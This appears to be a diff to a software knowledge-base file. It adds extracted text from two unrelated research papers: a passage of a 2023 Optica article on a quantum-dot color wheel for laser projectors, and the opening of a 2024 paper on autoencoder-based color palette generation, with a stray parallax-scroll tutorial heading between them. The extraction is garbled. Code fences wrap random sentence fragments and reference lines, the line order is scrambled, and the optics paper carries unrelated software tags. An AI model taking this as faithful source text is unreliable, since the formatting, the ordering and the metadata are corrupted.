+from 94.3% to 99.3% and from 34.7% to 39.5%, respectively. The
+Research Article Vol. 10, No. 11 / November 2023 / Optica 1563
+```
+chromaticity coordinate changes from (0.543, 0.236) to (0.677,
+```
+```
+0.300). It means that the DBR can greatly reduce the number
+```
+of blue photons passing through the QDCCL and improve the
+color purity of the QDCCL. When θR : θG : θB = 1 : 1 : 1 is
+set for the QD-CW device sample, the average LCE is 57.0%.
+Compared to a conventional CF-based phosphor-converted
+CW, in which the loss in CF layers is over 74.0% [54], the over-
+all LCE is improved by 31.0% when the optimized duty cycle,
+θR : θG : θB = 3.286 : 4.286 : 1, is set.
+```
+The working mechanism of the DBR is illustrated in Fig. 4(d).
+```
+The incident blue light with the intensity IB can be divided into
+two parts after passing through the green QDCCL: the converted
+green light with the intensity IG , and the remaining blue light with
+the intensity Ib . The remaining blue light cannot pass through
+DBR and would excite the QDCCL again. Ig is the intensity of
+the converted light after reuse of the blue light. That is why the
+```
+converted light intensity shown in Fig. 3(c) can be improved after
+```
+introducing this DBR.
+C. White Balance
+The QD-CW device sample is electrically driven by a small motor
+and rotated at a uniform speed to achieve the white balance output.
+```
+Figure 5(a) shows the explosive view of the working QD-CW
+```
+```
+device and the corresponding testing platform (SRC-200M,
+```
+```
+Everfine Corporation). The blue light passes through the red,
+```
+green, and blue segment of the QD-CW sample in turn, and then
+the emitted light is collected by the spectral color luminance meter.
+```
+Figure 5(b) shows the working principle of the QD-CW device
+```
+sample for color conversion. In a complete rotation cycle T, the
+QD-CW device sample will output blue, green, and red light
+in turn according to the pre-determined duty cycle. When the
+Fig. 5. White balance realization of the QD-CW device sample.
+```
+(a) Explosive view of the QD-CW device sample and the corresponding
+```
+```
+testing platform. (b) Working principle of the QD-CW device sample.
+```
+```
+(c) Measured spectrum of the white light emitted. (d) Output spatial
+```
+```
+light intensity distribution. (e) Color gamut area of the QD-CW device
+```
+sample.
+transparent part of the QD-CW device sample is rotated above the
+blue mini-LED backlight, the QD-CW device sample will output
+blue light in T1. Similarly, T2 and T3, respectively, represent the
+red and green light output periods when the red or green QDCCL
+on the QD-CW is aligned with the blue mini-LED backlight.
+More details about the output red, green, and blue light from the
+QD-CW device sample can be found in Supplement 1.
+The final emission spectrum of the QD-CW device sample
+```
+is shown in Fig. 5(c). The chromaticity coordinate is (0.317,
+```
+```
+0.338), which matches well with the chromaticity coordinate
+```
+```
+(0.313,0.329) of the D65 white balance. The inset of Fig. 5(c)
+```
+shows the fast-spinning QD-CW device sample achieving white
+balance. When the QD-CW device sample is rotating at a low
+speed, the color separation can be clearly observed. As the speed
+increases, the white light is observed without color separation.
+The three primary colors are mixed uniformly in the space. The
+complete video clip recorded from the QD-CW device sample
+achieving white balance can be found in Visualization 1.
+For the QD-CW device, the color breakup phenomenon
+cannot be ignored when the CW’s rotation speed is slower than
+the refresh frequency of the projector’s display panel. Increasing
+the color wheel’s rotation speed to synchronize with the display
+panel should be a straightforward approach to mitigate the color
+breakup. In this case, other issues that are worth noting should be
+the mechanical stability and noise of the QD-CW device. After a
+good matching between the color wheel’s rotation speed and the
+refresh frequency of the projector’s display panel, another main
+cause of the color breakup should be the visual stability of the
+human eye [55]. In this case, the occurrence of the color breakup
+phenomenon is mainly attributed to the action of eye position
+signals during the saccade movement. To mitigate this kind of
+color breakup, one approach is to use a multiple primary color
+wheel or swirl color wheel to enhance color overlay and balance,
+where the multiple primary color QDCCL has been demonstrated
+before [56]. The second method is the image motion compen-
+sation, which first calculates the motion vector through the pixel
+displacement between adjacent frames and then compensates for
+the pixel position in the current frame to offset the displacement
+generated by the eye position signal.
+```
+As shown in Fig. 5(d), the output spatial light intensity distribu-
+```
+tion of the QD-CW device sample is measured by the photometer
+```
+(GO-I300, Everfine Corporation). It can be seen that the spatial
+```
+light intensity distribution matches the standard Lambertian
+distribution, which is beneficial for displays with a large viewing
+angle. At the same time, the color gamut area of the QD-CW sys-
+tem is defined as the comparison between the three primary color
+triangular area of the QD-CW based display and the triangular
+area of the NTSC standard [57]. Therefore, the color gamut area is
+calculated to reach 116.6% NTSC, which is approximately 40%
+higher than a conventional CW system.
+D. Projection Display
+```
+Figure 6(a) shows the schematic of a projection display prototype
+```
+that is combined by a blue laser pumped projector and the prepared
+QD-CW device sample. The blue imaging pattern emitted by
+the laser projector will pass through the chromatic segments on
+the QD-CW device in turn. The corresponding color-converted
+```
+images on the screen are shown in Figs. 6(b)–6(d). The blue image
+```
+```
+in Fig. 6(b) is clear, because the blue light can directly pass through
+```
+the QD-CW device sample. However, the red and green images
+Research Article Vol. 10, No. 11 / November 2023 / Optica 1564
+Fig. 6. Projector prototype based on the prepared QD-CW device
+```
+sample. (a) Schematic of the projector. (b)–(d) Projection images
+```
+generated by the QD-CW device sample.
+become somewhat fuzzy because of the QD scattering. The QD
+scattering also brings some blue light leakage, resulting in the color
+```
+deviation from pure red and green in Figs. 6(c) and 6(d). This
+```
+prototype shows a straightforward projection application based
+on the QD-CW device sample. In addition, this QD-CW can also
+generate white-balanced light by a blue backlight, which makes it
+compatible with passive luminous projection architectures, such as
+DMD, LCoS, and LCD.
+For this prototype, both the QD scattering and the relative
+location with projection optics will affect the projector contrast to
+some extent, which is discussed in detail and experimentally com-
+pared to a conventional phosphor-based CW. In Supplement 1, it
+is found that the QD-CW provides a higher image contrast than a
+conventional phosphor-based CW device. The main reason is that
+the phosphor powders have larger particle sizes than QDs, which
+leads to stronger scattering characteristics and more color conver-
+sion light leaking into the background area. On the other part, the
+relative position between the blue laser projector and the QD-CW
+affects the size of the excited region, and the relative position of
+the QD-CW and the projection screen determines whether the
+scattered light will affect the overall area of the projection screen.
+Inserting a focusing optical element could help to shield scattered
+light outside the excitation area and further improve the projector
+contrast.
+Another concern is the thermal quenching and photodegrada-
+tion of the QD-CW device. In this work, the rated power of the
+laser projector used is 25 W, and the luminous flux of the blue light
+that excites the QD-CW is measured to be only 0.35 lm. Under
+such low blue light excitation, there is not much of a decrease in the
+brightness from the potential thermal quenching of QD materials.
+Moreover, the QDCC materials encapsulated in the photoresist
+also have certain advantages in thermal stability compared to pure
+QDs. The reliability testing details of the QD-CW device can be
+found in Supplement 1. Note that when using a laser projector as a
+blue excitation source, the stability of the QD-CW device largely
+depends on the intensity of the laser source. When a high-power
+blue laser is used, the lattice destruction of the QDs would be
+promoted by water and oxygen, causing fluorescence quenching of
+the QD-CW device. Atomic layer deposition or a polymer matrix
+are possible approaches to lengthen the QD’s lifetime [8,58,59].
+5. CONCLUSION
+This paper presents and systematically studies a newly proposed
+QD-CW device by theoretical derivation, simulation analysis, and
+experimental verification. The duty cycle of the QD-CW device
+is theoretically calculated as θR : θG : θB = 3.286 : 4.286 : 1 to
+achieve the white balance, and the CIE chromaticity coordinate
+```
+point is proven to be (0.313, 0.328) from ray-tracing simulation.
+```
+For experimental verification, a QD-CW device sample was pre-
+pared using multiple rounds of a photolithography process. By
+integrating a DBR, the QD-CW device can provide the white light
+```
+output with a chromaticity coordinate point of (0.317,0.338),
+```
+which matches well with the standard D65 light source and the
+simulation result. The color gamut area of the QD-CW device
+sample reaches 116.6% NTSC, and the average LCE is 57.0%.
+The proposed QD-CW device has 1.2× higher LCE and ∼40%
+higher color gamut area than a conventional CW device. A direct-
+view laser pumped projector is assembled by this QD-CW device
+sample, where the full-color projection images are realized. It
+is expected that this novel QD-CW device with its improved
+efficiency and color performance will be used for applications in
+projection displays and related display fields.
+```
+Funding. National Natural Science Foundation of China (62175032); Fujian
+```
+Science and Technology Innovation Laboratory for Optoelectronic Information of
+```
+China (2020ZZ111).
+```
+Disclosures. The authors declare no conflicts of interest.
+Data availability. Data underlying the results presented in this paper are not
+publicly available at this time but may be obtained from the authors upon reason-
+able request.
+Supplemental document. See Supplement 1 for supporting content.
+REFERENCES
+1. S. Han, I. Sato, T. Okabe, and Y. Sato, “Fast spectral reflectance recov-
+```
+ery using DLP projector,” Int. J. Comput. Vision 110, 172–184 (2014).
+```
+2. G. Koutaki, H. Okajima, N. Matsunaga, and K. Uchimura, “Optimization
+of color quantization with total luminance for Dlp projector and its evalu-
+ation system,” in IEEE International Conference on Image Processing
+```
+(ICIP) (2015), pp. 38–42.
+```
+3. M. J. O’Callaghan, R. Ferguson, R. Vohra, W. Thurmes, A. W. Harant,
+C. S. Pecinovsky, Y. Zhang, S. Yang, M. O’Neill, and M. A. Handschy,
+“Bistable FLCOS devices for doubled-brightness micro-projectors,” J.
+```
+Soc. Inf. Disp. 17, 369–375 (2009).
+```
+4. S. Liao, Z. Yang, J. Lin, S. Wang, J. Zhu, and S. Chen, “A hierarchi-
+cal structure perovskite quantum dots film for laser-driven projection
+```
+display,” Adv. Funct. Mater. 33, 2210558 (2023).
+```
+5. J. Li, D. Zhou, Y. Liu, Y. Chen, J. Chen, Y. Yang, Y. Gao, and J. Qiu,
+```
+“Engineering CsPbX3 (X = Cl, Br, I) quantum dot-embedded borosilicate
+```
+glass through self-crystallization facilitated by NaF as a phosphor for
+full-color illumination and laser-driven projection displays,” ACS Appl.
+```
+Mater. Interfaces 15, 22219–22230 (2023).
+```
+6. F. Hu and Y. Li, “Laser and phosphor hybrid source for projection
+```
+display,” Proc. SPIE 8599, 85991K (2013).
+```
+7. B. H. Kim, S. Nam, N. Oh, et al., “Multilayer transfer printing for pixe-
+lated, multicolor quantum dot light-emitting diodes,” ACS Nano 10,
+```
+4920–4925 (2016).
+```
+8. Y. Chen, J. Cai, J. Lin, X. Hu, C. Wang, E. Chen, J. Sun, Q. Yan, and T.
+Guo, “Quantum-dot array with a random rough interface encapsulated
+```
+by atomic layer deposition,” Opt. Lett. 47, 166–169 (2022).
+```
+9. E. Chen, J. Lin, T. Yang, Y. Chen, X. Zhang, Y. Ye, J. Sun, Q. Yan, and T.
+Guo, “Asymmetric quantum-dot pixelation for color-converted white
+```
+balance,” ACS Photon. 8, 2158–2165 (2021).
+```
+10. S. Xu, T. Yang, J. Lin, Q. Shen, J. Li, Y. Ye, L. Wang, X. Zhou, E. Chen,
+Y. Ye, and T. Guo, “Precise theoretical model for quantum-dot color con-
+```
+version,” Opt. Express 29, 18654–18668 (2021).
+```
+Research Article Vol. 10, No. 11 / November 2023 / Optica 1565
+11. J. Kim, H. J. Shim, J. Yang, M. K. Choi, D. C. Kim, J. Kim, T. Hyeon, and
+D. H. Kim, “Ultrathin quantum dot display integrated with wearable elec-
+```
+tronics,” Adv. Mater. 29, 1700217 (2017).
+```
+12. G. Zaiats, S. Ikeda, S. Kinge, and P. V. Kamat, “Quantum dot light-
+emitting devices: beyond alignment of energy levels,” ACS Appl. Mater.
+```
+Interfaces 9, 30741–30745 (2017).
+```
+13. C. Cheng, A. Liu, G. Ba, I. S. Mukhin, F. Huang, R. M. Islamova, W.
+C. H. Choy, and J. Tian, “High-efficiency quantum-dot light-emitting
+diodes enabled by boosting the hole injection,” J. Mater. Chem. C 10,
+```
+15200–15206 (2022).
+```
+14. D. Zhang, Y. Liu, and L. Zhu, “Surface engineering of ZnO nanoparti-
+cles with diethylenetriamine for efficient red quantum-dot light-emitting
+```
+diodes,” iScience 25, 105111 (2022).
+```
+15. Z. He, C. Zhang, H. Chen, Y. Dong, and S. T. Wu, “Perovskite downcon-
+verters for efficient, excellent color-rendering, and circadian solid-state
+```
+lighting,” Nanomaterials 9, 176 (2019).
+```
+16. Z. He, J. He, C. Zhang, S. T. Wu, and Y. Dong, “Swelling-deswelling
+microencapsulation-enabled ultrastable perovskite-polymer
+```
+composites for photonic applications,” Chem. Rec. 20, 672–681 (2020).
+```
+17. T. H. Kim, K. S. Cho, E. K. Lee, S. J. Lee, J. Chae, J. W. Kim, D. H. Kim, J.
+Y. Kwon, G. Amaratunga, S. Y. Lee, B. L. Choi, Y. Kuk, J. M. Kim, and K.
+Kim, “Full-colour quantum dot displays fabricated by transfer printing,”
+```
+Nat. Photonics 5, 176–182 (2011).
+```
+18. A. G. Vitukhnovskii, A. A. Vaschenko, D. N. Bychkovskii, D. N. Dirin, P. N.
+Tananaev, M. S. Vakshtein, and D. A. Korzhonov, “Photo- and electro-
+luminescence from semiconductor colloidal quantum dots in organic
+```
+matrices: QD-OLED,” Semiconductors 47, 1567–1569 (2013).
+```
+19. W. Huang, Q. Jin, D. Zhao, Z. Sun, W. Li, S. Shu, Q. Sun, Y. Tian, J.
+Zhang, and C. An, “62-2: flexible full-color active-matrix quantum-dot
+```
+OLED display,” SID Symp. Dig. Tech. Pap. 52, 888–891 (2021).
+```
+20. W. Mei, Z. Zhang, A. Zhang, D. Li, X. Zhang, H. Wang, Z. Chen, Y. Li, X. Li,
+and X. Xu, “High-resolution, full-color quantum dot light-emitting diode
+display fabricated via photolithography approach,” Nano Res. 13, 2485–
+```
+2491 (2020).
+```
+21. C. Cheng, X. Sun, Z. Yao, C. Bi, X. Wei, J. Wang, and J. Tian, “Balancing
+charge injection in quantum dot light-emitting diodes to achieve high
+```
+efficienciy of over 21%,” Sci. China Mater. 65, 1882–1889 (2022).
+```
+22. T. Ryowa, T. Ishida, Y. Sakakibara, K. Kitano, M. Ueda, M. Izumi, Y.
+Ogura, M. Tanaka, S. Nikata, M. Watanabe, M. Takasaki, T. Itoh, and
+A. Miyanaga, “58-3: distinguished paper: high-efficient quantum-dot
+light-emitting diodes with blue cadmium-free quantum dots,” SID Symp.
+```
+Dig. Tech. Pap. 51, 866–869 (2020).
+```
+23. Y. Huang, J. Chen, Y. H. Liou, K. J. Singh, W. C. Tsai, J. Han, C. Lin, T. S.
+Kao, C. Lin, S. Chen, and H. Kuo, “High-uniform and high-efficient color
+conversion nanoporous GaN-based micro-LED display with embedded
+```
+quantum dots,” Nanomaterials 12, 2696 (2022).
+```
+24. K. Ding, V. Avrutin, N. Izyumskaya, U. Ozgur, and H. Morkoc,
+“Micro-LEDs, a manufacturability perspective,” Appl. Sci. 9, 1206
+```
+(2019).
+```
+25. A. R. Anwar, M. T. Sajjad, M. A. Johar, C. A. Hernández-Gutiérrez, M.
+Usman, and S. P. Łepkowski, “Recent progress in micro-LED-based
+```
+display technologies,” Laser Photon. Rev. 16, 2100427 (2022).
+```
+26. W. H. Kim, Y. Jang, J. Y. Kim, M. Han, M. Kang, K. Yang, J. H. Ryou, and
+M. K. Kwon, “High-performance color-converted full-color micro-LED
+```
+arrays,” Appl. Sci. 10, 2112 (2020).
+```
+27. Z. Wei, L. Wang, Z. Liu, C. Zhang, C. Chen, M. Wu, Y. Yang, C. Yu, L.
+Wang, and H. Fu, “Multigigabit visible light communication based on
+high-bandwidth InGaN quantum dot green micro-LED,” ACS Photon. 9,
+```
+2354–2366 (2022).
+```
+28. H. J. Kim, M. H. Shin, and Y. J. Kim, “Optical efficiency enhancement in
+white organic light-emitting diode display with high color gamut using
+patterned quantum dot film and long pass filter,” Jpn. J. Appl. Phys. 55,
+```
+08RF01 (2016).
+```
+29. Y. Yin, Z. Hu, M. U. Ali, M. Duan, L. Gao, M. Liu, W. Peng, J. Geng, S. Pan,
+Y. Wu, J. Hou, J. Fan, D. Li, X. Zhang, and H. Meng, “Full-color micro-
+LED display with CsPbBr3 perovskite and CdSe quantum dots as color
+```
+conversion layers,” Adv. Mater. 5, 2000251 (2020).
+```
+30. H. V. Han, H. Y. Lin, C. C. Lin, W. C. Chong, J. R. Li, K. J. Chen, P. C.
+Yu, T. M. Chen, H. M. Chen, K. M. Lau, and H. C. Kuo, “Resonant-
+enhanced full-color emission of quantum-dot-based micro-LED display
+```
+technology,” Opt. Express 23, 32504–32515 (2015).
+```
+31. S. W. H. Chen, Y. M. Huang, K. J. Singh, Y. C. Hsu, F. Y. Liou, J. Song, J.
+Choi, P. S. Lee, C. C. Lin, Z. Chen, J. Han, T. Z. Wu, and H. C. Kuo, “Full-
+```
+color micro-LED display with high color stability using semipolar (20-21)
+```
+InGaN LEDs and quantum-dot photoresist,” Photon. Res. 8, 630–636
+```
+(2020).
+```
+32. T. Xuan, S. Shi, L. Wang, H. Kuo, and R. Xie, “Inkjet-printed quan-
+tum dot color conversion films for high-resolution and full-color micro
+light-emitting diode displays,” J. Phys. Chem. Lett. 11, 5184–5191
+```
+(2020).
+```
+33. V. Flauraud, M. Reyes, R. Paniagua-Dominguez, A. I. Kuznetsov, and J.
+Brugger, “Silicon nanostructures for bright field full color prints,” ACS
+```
+Photon. 4, 1913–1919 (2017).
+```
+34. M. Frobel, F. Fries, T. Schwab, S. Lenk, K. Leo, M. C. Gather, and S.
+Reineke, “Three-terminal RGB full-color OLED pixels for ultrahigh
+```
+density displays,” Sci. Rep. 8, 9684 (2018).
+```
+35. F. Li, S. Huang, X. Y. Liu, Z. L. Bai, Z. T. Wang, H. D. Xie, X. D. Bai, and
+H. Z. Zhong, “Highly stable and spectrally tunable gamma phase
+Rbx Cs1−x PbI3 gradient-alloyed quantum dots in PMMA matrix through A
+```
+sites engineering,” Adv. Funct. Mater. 31, 2008211 (2021).
+```
+36. K. Hieda, T. Maruyama, and F. Narusawa, “P-15.2: a study for easy
+and quick white balance adjustment in laser display production,” in
+```
+International Conference on Display Technology (ICDT) (2019)., Vol. 50,
+```
+pp. 999–1001.
+37. E. Chen, H. Xie, J. Huang, H. Miu, G. Shao, Y. Li, T. Guo, S. Xu, and Y. Ye,
+“Flexible/curved backlight module with quantum-dots microstructure
+```
+array for liquid crystal displays,” Opt. Express 26, 3466–3482 (2018).
+```
+38. D. K. Dubey, S. Sahoo, C. W. Wang, and J. H. Jou, “Solution process
+feasible highly efficient white organic light emitting diode,” Org. Electron.
+```
+69, 232–240 (2019).
+```
+39. E. Aksoy, A. Danos, C. Varlikli, and A. P. Monkman, “Navigating CIE
+space for efficient TADF downconversion WOLEDs,” Dyes Pigm. 183,
+```
+108707 (2020).
+```
+40. S. Y. Chen and M. C. Wei, “LED illumination and color appearance of
+```
+white-balanced images,” Leukos 16, 203–215 (2020).
+```
+41. I. Boyadzhiev, K. Bala, S. Paris, and F. Durand, “User-guided white bal-
+ance for mixed lighting conditions,” ACM Trans. Graph. 31, 201–210
+```
+(2012).
+```
+42. H. S. Shim, M. Ko, S. Jeong, S. Y. Shin, S. M. Park, Y. R. Do, and J. K.
+Song, “Enhancement mechanism of quantum yield in alloyed-core/shell
+structure of ZnS–CuInS2 /ZnS quantum dots,” J. Phys. Chem. C 125,
+```
+9965–9972 (2021).
+```
+43. J. Lim, W. K. Bae, D. Lee, M. K. Nam, J. Jung, C. Lee, K. Char, and S.
+Lee, “InP@ZnSeS, Core@Composition gradient shell quantum dots with
+```
+enhanced stability,” Chem. Mater. 23, 4459–4463 (2011).
+```
+44. H. Xie, E. Chen, Y. Ye, S. Xu, and T. Guo, “Highly stabilized gradient
+alloy quantum dots and silica hybrid nanospheres by core double shells
+for photoluminescence devices,” J. Phys. Chem. Lett. 11, 1428–1434
+```
+(2020).
+```
+45. H. Yang, Y. Liu, J. Hao, H. Tang, S. Ding, Z. Wang, F. Fang, D. Wu, W.
+Zhang, and H. Liu, “Alloyed green-emitting CdZnSeS/ZnS quantum dots
+with dense protective layers for stable lighting and display applications,”
+```
+ACS Appl. Mater. Interfaces 13, 32217–32225 (2021).
+```
+46. Q. Yong, J. Chang, Q. Liu, F. Jiang, D. Wei, and H. Li, “Matt polyurethane
+```
+coating: correlation of surface roughness on measurement length and
+```
+```
+gloss,” Polymers 12, 326 (2020).
+```
+47. M. Kamal, Z. Tang, and T. Huang, “Morphological characterization of PE
+blown films by atomic force microscopy,” Int. Polym. Proc. 16, 376–387
+```
+(2022).
+```
+48. A. Agrawal and Y. Tchoe, “Scaling study of molecular beam epitaxy
+grown InAs/Al2 O3 films using atomic force microscopy,” Thin Solid Films
+```
+709, 138204 (2020).
+```
+49. M. F. Schubert, J. Q. Xi, J. K. Kim, and E. F. Schubert, “Distributed Bragg
+reflector consisting of high- and low-refractive-index thin film layers
+```
+made of the same material,” Appl. Phys. Lett. 90, 141115 (2007).
+```
+50. C. Zhang, R. ElAfandy, and J. Han, “Distributed Bragg reflectors for
+GaN-based vertical-cavity surface-emitting lasers,” Appl. Sci. 9, 1593
+```
+(2019).
+```
+51. J. Liu, D. Liu, Y. Shen, X. Yang, C. Zhao, R. Chen, Z. Yang, J. Liu, J. Ma,
+and H. Xiao, “Fabrication and applications of wafer-scale nanoporous
+GaN near-infrared distributed Bragg reflectors,” Opt. Mater. 107, 110093
+```
+(2020).
+```
+52. T. Lin, J. Xie, T. Zhang, J. Li, H. Xie, and Y. Duan, “Studies on the
+material and photoluminescence characteristics of the structure of
+Al0.9 Ga0.1 As/GaAs DBR with varied doping,” J. Electron. Mater. 52,
+```
+730–737 (2023).
+```
+53. P. Li, Y. Zhang, Y. Yu, X. Han, L. Yan, G. Deng, and B. Zhang,
+“Optimization design and preparation of near ultraviolet AlGaN/GaN
+Research Article Vol. 10, No. 11 / November 2023 / Optica 1566
+distributed Bragg reflectors,” Superlattices Microstruct. 122, 661–666
+```
+(2018).
+```
+54. Y. C. Shih and F. G. Shi, “Quantum dot based enhancement or elimina-
+tion of color filters for liquid crystal display,” IEEE J. Sel. Top. Quantum
+```
+Electron. 23, 1–4 (2017).
+```
+55. Y. Aya and K. Ukai, “How color break-up occurs in the human-visual
+```
+system: the mechanism of the color break-up phenomenon,” J. Soc. Inf.
+```
+```
+Disp. 14, 1127–1133 (2006).
+```
+56. S. Lin, G. Tan, J. Yu, E. Chen, Y. Weng, X. Zhou, S. Xu, Y. Ye, Q. Yan, and
+T. Guo, “Multi-primary-color quantum-dot down-converting films for
+```
+display applications,” Opt. Express 27, 28480–28493 (2019).
+```
+57. R. Zhu, Z. Luo, H. Chen, Y. Dong, and S. T. Wu, “Realizing Rec. 2020
+color gamut with quantum dot displays,” Opt. Express 23, 23680–23693
+```
+(2015).
+```
+58. I. J. Plante, A. Barron, J. Yamanaga, M. Bautista, J. Tillman, X. Wang, H.
+Antoniadis, and J. Yurek, “Quantum dot color conversion for displays,”
+```
+SID Symp. Dig. Tech. Pap. 54, 792–794 (2023).
+```
+59. M. A. Triana, E. L. Hsiang, C. C. Zhang, Y. J. Dong, and S. T. Wu,
+“Luminescent nanomaterials for energy efficient display and
+```
+healthcare,” ACS Energy Lett. 7, 1001–1020 (2022).
+```
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, tdd, vcs, api]
+
 ### 📘 KNOWLEDGE: NEXUS_PARALLAX-SCROLL-EFFECTS.MD
 
 # Build a Parallax Effect on Scroll
@@ -9474,6 +19038,424 @@ For mutually exclusive UI paradigms (like custom exclusive panels where content 
 
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance]
+
+### 📘 KNOWLEDGE: NEXUS_SM3503.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+## 135
+Sensors and Materials, Vol. 36, No. 1 (2024) 135–146
+MYU Tokyo
+## S & M 3503
+## *
+Corresponding author: e-mail: trchou@ntnu.edu.tw
+https://doi.org/10.18494/SAM4537
+## ISSN 0914-4935 © MYU K.K.
+https://myukk.org/
+Color Palette Generation of Mixed Color Images
+## Using Autoencoder
+Tzren-Ru Chou
+## *
+and Jie-Yun Shao
+Department of Graphic Arts and Communications,
+## National Taiwan Normal University,
+No. 162, HePing E. Road, Section 1, Taipei 106, Taiwan, R.O.C.
+(Received May 31, 2023; accepted January 9, 2024)
+Keywords:	  color	palette,	color	image,	color	filter,	autoencoder
+The color sensor, fundamental in designing image filter algorithms for smartphones, is often
+developed  on  the  basis  of  the  demands  of  commercial  imaging  applications.  The  creation  of  a
+color  palette  is  an  essential  step  for  designers  when  planning  color  schemes.  In  this  study,  we
+introduce  a  method  for  generating  blended  color  imagery,  called  the  ‘color  image’  in  some
+previous works,
+## (8,9)
+to construct personalized palettes that cater to individual emotional needs.
+We  modified  the  training  approach  of  the  autoencoder,  incorporating  data  related  to  emotions
+into the training samples. This allowed us to establish a correspondence between color imagery
+and  palettes  on  the  basis  of  Kobayashi’s  color  image  scale.  Through  linear  interpolation
+calculations  between  different  types  of  imagery,  we  derived  the  emotional  coordinates  of
+blended  color  imagery.  Using  these  derived  coordinates,  we  fed  them  into  the  trained
+autoencoder model to reconstruct the generated palette for blended color imagery. We conducted
+a  visual  evaluation  experiment,  and  the  results  showed  that  the  emotional  conveyance  of  the
+generated blended color imagery palettes is consistent with human perception. Additionally, we
+presented two sample applications: emotional filters and background frameworks. We anticipate
+that the findings of this study can offer a new perspective for the development and application of
+the color sensor.
+## 1.       Introduction
+The  development  of  the  color  sensor  as  the  foundation  for  the  design  of  smartphone  image
+filter algorithms is often guided by the demands of commercial image applications. The use of
+color  in  design  has  been  extensively  researched,  and  its  effect  on  designers  during  the  design
+process  is  higher  than  that  of  form.
+## (1)
+Color  is  one  of  the  important  features  in  human  visual
+perception, and many psychologists have studied the relationship between color and perception.
+## (2)
+
+For example, Kaya and Epps found that color can affect cognitive performance.
+## (3)
+Hanada used
+correspondence analysis to analyze the relationship between color and emotion,
+## (4)
+whereas Chen
+et al. assigned colors on the basis of vocabulary and found many similarities in the responses of
+
+136 Sensors and Materials, Vol. 36, No. 1 (2024)
+subjects from the UK and China.
+## (5)
+Color is crucial in design, whether it is for website design,
+product  packaging,  or  advertising  posters,  as  it  helps  convey  the  designer’s  intended  message
+and emotions. Generating the color palette is an important step in creating color schemes, and
+the  right  palette  can  significantly  affect  people’s  emotional  responses.  Traditionally,  the
+correlation  between  color  palettes  and  emotions  is  evaluated  on  the  basis  of  the  designer’s
+experience.  The  automatic  color  palette  generation  method  proposed  in  this  study  can  help
+designers speed up the process of creating color schemes.
+Color palette generation has gradually become an essential design tool in modern design, as
+demonstrated by the image-based color palette method developed.
+## (6)
+This technique can not only
+be  widely  used  in  product  design  but  also  applied  to  various  multimedia  platforms,  such  as
+websites,  applications,  videos,  and  animations.  With  appropriate  color  palette  generation
+technology,  designers  can  more  easily  select  the  best  color  palette.  Personalized  color  palettes
+are also gaining attention in multimedia design, as they can create an atmosphere that matches
+the emotional intent of the content and improve the user experience, as shown in Fig. 1. In recent
+years, personalized color palettes that reflect a person’s emotions and personality have become
+increasingly popular, and studies have shown that people with strong personalities tend to prefer
+colors that represent their personality traits.
+## (7)
+To meet this demand, we developed a method of
+generating a mixed color image to create personalized color palettes that match emotional needs.
+The proposed method involves creating a mixed color image with specific emotions and using an
+autoencoder  to  generate  a  color  palette  that  reflects  the  emotional  content  of  the  mixed  color
+image. As shown in Fig. 2, different degrees of color filters from sweet to bitter are generated.
+The  generated  color  palette  will  be  personalized  and  designed  to  elicit  the  desired  emotional
+response. This method has the potential for revolutionary development in various industries.
+Color  plays  a  crucial  role  in  design,  and  an  appropriate  color  palette  can  affect  people’s
+emotional  responses.  We  propose  a  method  for  generating  a  blended  color  image  with
+personalized and effective qualities to create color palettes that meet emotional needs. The study
+uses  the  color  image  scale  (CIS)  research  data,
+## (8,9)
+which  was  created  by  Kobayashi  through
+pioneering research on emotional vocabulary and color palettes using the semantic differential
+method and factor analysis, and shows the correlation between color and emotion on the CIS.
+The  first  step  was  to  reconstruct  Kobayashi’s  CIS  research  into  data  that  includes  several
+color palettes for each color image and image location. In this study, we refer to image location
+as  color  image  emotional  coordinates  (CIECs),  where  images  and  color  palettes  with  adjacent
+CIEC locations are similar. Conversely, the farther the CIEC location, the greater the difference
+between  the  image  and  the  color  palette.  Next,  the  data  was  placed  into  an  autoencoder  as
+training  samples  to  train  a  spatial  model  similar  to  the  original  data  for  use  in  generating  a
+blended  color  image.  Finally,  by  linear  interpolation,  the  blended  CIEC  was  calculated  and
+combined with the specified color palette in the trained model to generate a color palette for a
+blended color image.
+
+Sensors and Materials, Vol. 36, No. 1 (2024) 137
+- Data, Materials, and Methods
+2.1 Color palette generation
+One common way to generate a color palette is by extracting colors from an image, such as
+using image segmentation in the HSI color space to produce a layered color palette.
+## (10)
+Wa ng  et
+al. mapped the relationship between color themes and affective words to Kobayashi’s CIS, and
+then  expanded  the  data  using  internet  resources  to  convert  the  emotional  representation  of
+images using this database.
+## (11)
+Another method is to extract the emotional value of a theme from
+pixels.
+## (12)
+Kim and Suk proposed a method of generating emotionally diverse key colors using
+techniques  such  as  neural  networks  and  emotion  analysis,  which  can  generate  emotionally
+appropriate colors on the basis of user needs.
+## (13)
+Kita et al. proposed a color-palette-based image
+Fig.	1.	   (Color	online)	Application	of	  generated	results	on	   image	filters.
+Fig.	2.	   (Color	online)	Results	of	  generating	color	filters	with	varying	degrees	of	  sweetness	to	  bitterness.
+
+138 Sensors and Materials, Vol. 36, No. 1 (2024)
+search  method  that  uses  color  weight  and  color  palette  matching  to  search  for  relevant  images
+based  on  user-specified  color  palettes,  further  expanding  the  application  range  of  color
+palettes.
+## (14)
+Xu et al. aimed to explore the connection between words and colors, which may vary
+across  different  cultural  backgrounds.
+## (15)
+To  achieve  this,  researchers  used  the  CIS  tool  and
+crawled  a  large  number  of  image  data  from  sites  such  as  Flickr  and  Google  Image  Search  to
+build a dataset containing different word and color associations. This data set was used to train
+the model to evaluate the degree of association between different words and colors.
+These studies demonstrate the diversity and importance of generating color palettes. Whether
+generating  a  color  palette  from  keywords  or  images,  the  ultimate  goal  is  to  allow  colors  to
+convey the emotions that viewers may perceive, further affecting human perception.
+2.2 Color image
+The combination of colors in images can connect users on an emotional level, making it an
+important tool in the field of design. According to Zhang and Yang,
+## (16)
+color is a psychological
+attribute  that  evokes  emotions  in  visual  experiences  and  creates  emotional  resonance  with
+people.  Kobayashi’s  CIS  is  a  dataset  that  is  relevant  to  this.  Kobayashi  first  positioned  140
+monochromatic  colors  on  a  two-dimensional  CIS,  and  then  used  psychological  experiments  to
+position  adjectives  describing  a  color  image  on  a  similar  scale,  known  as  the  adjective  image
+scale.
+## (8)
+On  the  basis  of  monochromatic  colors,  a  series  of  color  combinations  applicable  to
